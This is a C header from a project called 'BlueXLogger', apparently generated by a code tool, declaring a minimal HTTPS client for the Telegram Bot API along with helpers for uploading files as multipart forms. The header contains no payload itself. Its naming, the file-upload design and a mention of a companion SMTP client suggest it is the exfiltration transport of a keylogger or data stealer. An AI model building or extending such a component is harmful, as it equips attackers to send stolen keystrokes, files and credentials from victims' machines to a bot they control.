/*============================================================================
 * BlueXLogger - bxl_http.h
 * Minimal HTTPS/1.1 client for the Telegram Bot API.
 *
 * Created by Xencode-CLI by xanthorox
 *
 * Scope
 * -----
 * This is deliberately not a general-purpose HTTP stack. It exists to talk to
 * one well-behaved endpoint (api.telegram.org) and it implements exactly the
 * subset that requires:
 *
 *   - implicit TLS from the first byte, via the same SChannel layer the SMTP
 *     client uses, so there is one TLS implementation to trust;
 *   - POST with a caller-supplied Content-Type, because the Bot API takes
 *     JSON for text and multipart/form-data for files;
 *   - response parsing that tolerates both Content-Length and chunked
 *     transfer-encoding, since a proxy in front of the API may switch to
 *     chunked without warning;
 *   - a body cap, so a misbehaving endpoint cannot exhaust memory.
 *
 * Redirects, cookies, connection reuse and HTTP/2 are not implemented. The
 * Bot API needs none of them.
 *==========================================================================*/
#ifndef BXL_HTTP_H
#define BXL_HTTP_H

#include "bxl_common.h"
#include "bxl_net.h"

/* Response body ceiling. Telegram's largest single response (getUpdates with
 * a full backlog) sits far below this; the cap only exists to bound a hostile
 * or broken peer. */
#define BXL_HTTP_MAX_BODY  (4u * 1024u * 1024u)

typedef struct BxlHttpResponse {
    int    status;          /* HTTP status code, or 0 when no reply parsed */
    char  *body;            /* NUL-terminated; caller frees with free()      */
    size_t body_len;
    char   error[512];      /* populated when the request did not complete   */
    int    ok;              /* transport-level success (status may still 4xx)*/
} BxlHttpResponse;

/*
 * One-shot HTTPS POST. Opens the connection, negotiates TLS, sends the
 * request and reads the whole reply, then closes.
 *
 *   host        - "api.telegram.org"
 *   port        - 443
 *   path        - "/bot<token>/sendMessage"
 *   content_type- e.g. "application/json" or the multipart boundary header
 *   body/body_len - request payload (may be NULL/0 for a bodyless POST)
 *   timeout_ms  - per-socket-operation timeout
 *
 * Returns BXL_TRUE when a complete response was read. A 4xx/5xx status is
 * still BXL_TRUE: the transport worked, and the caller decides whether the
 * status is fatal. res->ok distinguishes the two.
 */
int bxl_http_post(const char *host, int port, const char *path,
                  const char *content_type,
                  const void *body, size_t body_len,
                  int timeout_ms, BxlHttpResponse *res);

/* One-shot HTTPS GET, for small plain-text endpoints. */
int bxl_http_get(const char *host, int port, const char *path,
                 int timeout_ms, BxlHttpResponse *res);

void bxl_http_response_free(BxlHttpResponse *res);

/*
 * Minimal JSON field reader for Bot API replies.
 *
 * Telegram replies are of the form {"ok":true,"result":{...}}. Pulling a
 * single string or boolean out of that without a parser is safe enough here
 * because the keys are fixed and the values we read are never nested inside
 * an array of the same name. These are intentionally shallow helpers, not a
 * JSON library.
 */

/* Copy the string value of "key" into out. Handles \" \\ \/ \n \r \t and
 * \uXXXX (BMP only, encoded as UTF-8). Returns BXL_TRUE when found. */
int bxl_json_get_string(const char *json, const char *key,
                        char *out, size_t out_cch);

/* Read a top-level boolean. Returns BXL_TRUE and sets *out when found. */
int bxl_json_get_bool(const char *json, const char *key, int *out);

/* Read an integer value. Returns BXL_TRUE and sets *out when found. */
int bxl_json_get_int(const char *json, const char *key, long *out);

/*==========================================================================
 * multipart/form-data builder
 *========================================================================*/
typedef struct BxlMultipart BxlMultipart;

/* Begin a form with a random boundary derived from a seed. */
BxlMultipart *bxl_mp_begin(void);

/* Add a plain text field. */
int bxl_mp_add_field(BxlMultipart *mp, const char *name, const char *value);

/* Add a file part. `data` is copied into the form. */
int bxl_mp_add_file(BxlMultipart *mp, const char *name, const char *filename,
                    const char *mime, const void *data, size_t len);

/* Finish the form. The returned buffer is owned by mp. */
const char *bxl_mp_data(BxlMultipart *mp, size_t *len_out);

/* The Content-Type header value, including the boundary. */
const char *bxl_mp_content_type(BxlMultipart *mp);

void bxl_mp_free(BxlMultipart *mp);

#endif /* BXL_HTTP_H */
